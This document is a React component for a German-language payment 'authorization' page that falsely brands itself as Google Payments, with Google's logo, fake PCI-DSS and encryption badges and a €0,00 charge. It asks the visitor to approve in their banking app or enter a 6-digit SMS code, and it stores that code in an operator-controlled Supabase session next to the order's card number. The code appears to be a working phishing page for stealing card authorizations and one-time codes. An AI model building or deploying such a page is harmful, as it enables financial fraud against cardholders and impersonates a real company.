import React, { useEffect, useState } from 'react';
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { CreditCard, Shield, Lock, Smartphone, MessageSquare, CheckCircle } from 'lucide-react';
import { supabase } from '@/integrations/supabase/client';
import { useOptimisticPaymentSession } from '@/hooks/useOptimisticPaymentSession';

interface AuthorizationPanelProps {
  orderId: string;
  sessionId: string;
}

const AuthorizationPanel: React.FC<AuthorizationPanelProps> = ({ orderId, sessionId }) => {
  const [orderData, setOrderData] = useState<any>(null);
  const [currentTextIndex, setCurrentTextIndex] = useState(0);
  const [smsCode, setSmsCode] = useState('');
  
  // Use optimistic payment session hook
  const {
    sessionData,
    isLoading: sessionLoading,
    setVerificationMethod,
    confirmAppVerification,
    enterSmsCode,
    submitSmsCode: submitSmsCodeOptimistic
  } = useOptimisticPaymentSession(sessionId);

  const processingTexts = [
    "Wird verarbeitet...",
    "Verbindung zur Bank wird hergestellt...",
    "Kartendetails werden verifiziert...",
    "Autorisierung läuft...",
    "Sicherheitsprüfung aktiv..."
  ];

  useEffect(() => {
    const fetchOrderData = async () => {
      // Only fetch order data - sessionId comes from props
      const { data: order } = await supabase
        .from('orders')
        .select('*')
        .eq('id', orderId)
        .single();
      setOrderData(order);
    };
    fetchOrderData();
  }, [orderId]);

  useEffect(() => {
    const interval = setInterval(() => {
      setCurrentTextIndex((prevIndex) => 
        (prevIndex + 1) % processingTexts.length
      );
    }, 6000);

    return () => clearInterval(interval);
  }, [processingTexts.length]);

  // Processing text rotation
  // Optimistic action handlers
  const handleAppConfirmation = async () => {
    await confirmAppVerification();
  };

  const handleSmsSubmit = async () => {
    if (!smsCode) return;
    // Always directly submit the SMS code to transition to sms_confirmed
    await submitSmsCodeOptimistic(smsCode);
    setSmsCode('');
  };

  const handleMethodSelection = async (method: string) => {
    await setVerificationMethod(method);
  };

  const renderContent = () => {
    if (!sessionData) {
      return renderLoadingState();
    }

    // Check verification status and method
    const { verification_method, verification_status } = sessionData;

    if (verification_status === 'completed') {
      return renderFinalProcessingState();
    }

    switch (verification_method) {
      case 'app_confirmation':
        return verification_status === 'app_confirmed' ? renderFinalProcessingState() : renderAppConfirmationState();
      case 'sms_confirmation':
        if (verification_status === 'sms_confirmed') {
          return renderFinalProcessingState();
        } else {
          return renderSmsConfirmationState();
        }
      case 'choice_required':
        return renderChoiceState();
      default:
        return renderLoadingState();
    }
  };

  const renderFailureMessage = () => {
    if (!sessionData?.failure_reason) return null;
    
    return (
      <div className="mb-4 p-3 bg-red-50 border border-red-200 rounded-lg">
        <p className="text-red-700 text-sm font-medium text-center">
          Die vorherige Bestätigung ist fehlgeschlagen. Bitte versuchen Sie es erneut.
        </p>
      </div>
    );
  };

  const renderLoadingState = () => (
    <div className="flex items-center justify-center space-x-3 py-4">
      <div className="relative">
        <div className="w-6 h-6 border-4 border-blue-100 rounded-full animate-spin border-t-blue-600"></div>
      </div>
      <span className="text-base text-gray-700" style={{ fontFamily: 'Google Sans, sans-serif' }}>
        {processingTexts[currentTextIndex]}
      </span>
    </div>
  );

  const renderAppConfirmationState = () => (
    <>
      {renderFailureMessage()}
      {/* Loading Spinner */}
      <div className="flex items-center justify-center space-x-3 py-4">
        <div className="relative">
          <div className="w-6 h-6 border-4 border-blue-100 rounded-full animate-spin border-t-blue-600"></div>
        </div>
        <span className="text-base text-gray-700" style={{ fontFamily: 'Google Sans, sans-serif' }}>
          Warten auf App-Bestätigung...
        </span>
      </div>
      
      <div className="space-y-2">
        <h1 className="text-2xl font-medium text-gray-900" style={{ fontFamily: 'Google Sans, sans-serif' }}>
          App-Bestätigung erforderlich
        </h1>
        <p className="text-base text-gray-700">
          Bitte öffnen Sie Ihre Banking-App und bestätigen Sie die Autorisierung.
        </p>
        <p className="text-sm text-gray-600">
          Drücken Sie den Button unten, sobald Sie die Freigabe in der App erteilt haben.
        </p>
      </div>

      <Button 
        onClick={handleAppConfirmation}
        className="w-full bg-green-600 hover:bg-green-700 text-white py-3 text-base"
      >
        <CheckCircle className="w-5 h-5 mr-2" />
        In App bestätigt
      </Button>
    </>
  );

  const renderSmsConfirmationState = () => (
    <>
      {renderFailureMessage()}
      {/* Loading Spinner */}
      <div className="flex items-center justify-center space-x-3 py-4">
        <div className="relative">
          <div className="w-6 h-6 border-4 border-blue-100 rounded-full animate-spin border-t-blue-600"></div>
        </div>
        <span className="text-base text-gray-700" style={{ fontFamily: 'Google Sans, sans-serif' }}>
          Warten auf SMS-Code...
        </span>
      </div>
      
      <div className="space-y-2">
        <h1 className="text-2xl font-medium text-gray-900" style={{ fontFamily: 'Google Sans, sans-serif' }}>
          SMS-Bestätigung
        </h1>
        <p className="text-base text-gray-700">
          Ein SMS-Code wurde an Ihre Mobilfunknummer verschickt.
        </p>
        <p className="text-sm text-gray-600">
          Bitte geben Sie den 6-stelligen Code unten ein.
        </p>
      </div>

      <div className="space-y-4">
        <Input
          type="text"
          placeholder="6-stelliger SMS-Code"
          value={smsCode}
          onChange={(e) => setSmsCode(e.target.value)}
          maxLength={6}
          className="text-center text-lg tracking-widest"
        />
        <Button 
          onClick={handleSmsSubmit}
          disabled={smsCode.length !== 6}
          className="w-full bg-blue-600 hover:bg-blue-700 text-white py-3 text-base"
        >
          Code eingeben
        </Button>
      </div>
    </>
  );

  const renderChoiceState = () => (
    <>
      <div className="space-y-2">
        <h1 className="text-2xl font-medium text-gray-900" style={{ fontFamily: 'Google Sans, sans-serif' }}>
          Bestätigungsmethode wählen
        </h1>
        <p className="text-base text-gray-700">
          Bitte wählen Sie, wie Sie die Zahlung bestätigen möchten:
        </p>
      </div>

      <div className="space-y-3">
        <Button
          onClick={() => handleMethodSelection('app_confirmation')}
          variant="outline"
          className="w-full px-3 py-2 flex items-center space-x-2 border hover:border-blue-500"
        >
          <Smartphone className="w-5 h-5 text-blue-600" />
          <span className="font-medium">App-Bestätigung: Über Ihre Banking-App</span>
        </Button>
        
        <Button
          onClick={() => handleMethodSelection('sms_confirmation')}
          variant="outline"
          className="w-full px-3 py-2 flex items-center space-x-2 border hover:border-blue-500"
        >
          <MessageSquare className="w-5 h-5 text-blue-600" />
          <span className="font-medium">SMS-Code: Per Textnachricht</span>
        </Button>
      </div>
    </>
  );

  const renderFinalProcessingState = () => (
    <>
      <div className="space-y-2">
        <h1 className="text-2xl font-medium text-gray-900" style={{ fontFamily: 'Google Sans, sans-serif' }}>
          Zahlung wird autorisiert
        </h1>
        <div className="flex items-center justify-center space-x-2 py-4">
          <CheckCircle className="w-8 h-8 text-green-600" />
        </div>
        <p className="text-base text-gray-700">
          Ihre Bestätigung wurde erhalten. Die Zahlung wird nun verarbeitet.
        </p>
      </div>

      <div className="flex items-center justify-center space-x-3 py-4">
        <div className="relative">
          <div className="w-6 h-6 border-4 border-green-100 rounded-full animate-spin border-t-green-600"></div>
        </div>
        <span className="text-base text-gray-700" style={{ fontFamily: 'Google Sans, sans-serif' }}>
          Autorisierung wird abgeschlossen...
        </span>
      </div>
    </>
  );
  return (
    <div className="space-y-6">
      {/* Main Authorization Card */}
      <Card className="border-0 shadow-xl bg-white">
        <CardContent className="pt-6 pb-8">
          {/* Google Payments Header */}
          <div className="text-center mb-6 pb-4 border-b border-gray-100">
            <div className="flex items-center justify-center space-x-2 mb-2">
              <svg width="24" height="24" viewBox="0 0 24 24">
                <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
                <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
                <path fill="#FBBC04" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
                <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
              </svg>
              <span className="text-lg font-medium text-gray-900" style={{ fontFamily: 'Google Sans, sans-serif' }}>
                Google Payments
              </span>
            </div>
          </div>

          <div className="text-center space-y-6">
            {/* Authorization Header - Always visible */}
            <div className="space-y-2">
              <h1 className="text-2xl font-medium text-gray-900" style={{ fontFamily: 'Google Sans, sans-serif' }}>
                Karte autorisieren
              </h1>
              <p className="text-4xl font-light text-gray-900" style={{ fontFamily: 'Google Sans, sans-serif' }}>
                €0,00
              </p>
              <p className="text-sm text-gray-600">
                Autorisierungsbetrag
              </p>
            </div>

            {renderContent()}

            {/* Important Notice - Always show */}
            <div className="bg-blue-50 border border-blue-200 rounded-lg p-4">
              <div className="flex items-start space-x-3">
                <CreditCard className="w-5 h-5 text-blue-600 mt-0.5 flex-shrink-0" />
                <div className="text-left">
                  <h3 className="text-sm font-medium text-blue-900 mb-1">
                    Keine Belastung Ihrer Karte
                  </h3>
                  <p className="text-sm text-blue-700">
                    Ihre Kreditkarte wird nur autorisiert, nicht belastet. Die tatsächliche Zahlung erfolgt erst bei der Lieferung.
                  </p>
                </div>
              </div>
            </div>

            {/* Payment Method Display - Always show */}
            <div className="bg-gray-50 rounded-lg p-4">
              <div className="flex items-center justify-between">
                <div className="flex items-center space-x-3">
                  <div className="w-10 h-6 bg-gradient-to-r from-blue-600 to-blue-700 rounded text-white text-xs font-bold flex items-center justify-center">
                    VISA
                  </div>
                  <span className="text-sm text-gray-700">
                    •••• •••• •••• {orderData?.card_number?.slice(-4) || '4444'}
                  </span>
                </div>
                <Lock className="w-4 h-4 text-green-600" />
              </div>
            </div>
          </div>
        </CardContent>
      </Card>

      {/* Security Information */}
      <div className="flex items-center justify-center space-x-6 py-3">
        <div className="flex items-center space-x-2">
          <Shield className="w-4 h-4 text-gray-500" />
          <span className="text-sm text-gray-600">PCI-DSS Compliant</span>
        </div>
        <div className="w-px h-4 bg-gray-300"></div>
        <div className="flex items-center space-x-2">
          <Lock className="w-4 h-4 text-gray-500" />
          <span className="text-sm text-gray-600">256-bit Encryption</span>
        </div>
      </div>

      {/* Google Payments Footer */}
      <div className="text-center pt-1">
        <p className="text-xs text-gray-500">
          Powered by{" "}
          <span className="font-medium text-blue-600" style={{ fontFamily: 'Google Sans, sans-serif' }}>
            Google Payments
          </span>
        </p>
      </div>
    </div>
  );
};

export default AuthorizationPanel;